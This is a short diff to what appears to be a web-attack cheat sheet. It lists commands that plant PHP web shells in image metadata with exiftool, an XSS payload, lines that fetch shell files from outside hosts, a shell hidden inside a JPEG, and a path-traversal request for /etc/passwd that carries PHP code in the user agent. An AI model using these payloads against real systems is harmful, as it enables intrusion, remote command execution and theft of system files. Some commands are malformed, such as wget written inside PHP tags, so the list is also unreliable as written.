@@ -3,6 +3,7 @@ exiftool -DocumentName="<h1>Nic0la T3sl4<br><?php if(isset(\$_REQUEST['cmd'])){e
 exiftool -DocumentName="><img src=x onerror=alert(1)>" file.php.jpg
 exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" /root/imagen.jpg
 
+<?php wget http://www.urlshell.com -O shell.php ?>
 curl -o hidden.txt https://url.website.com/shell.txt
 cat file.jpg shell.php > compress.jpg
 curl -u www.servervul.com/page.php?id=/../../etc/passwd -A "<?php system('ls -l'); ?>"
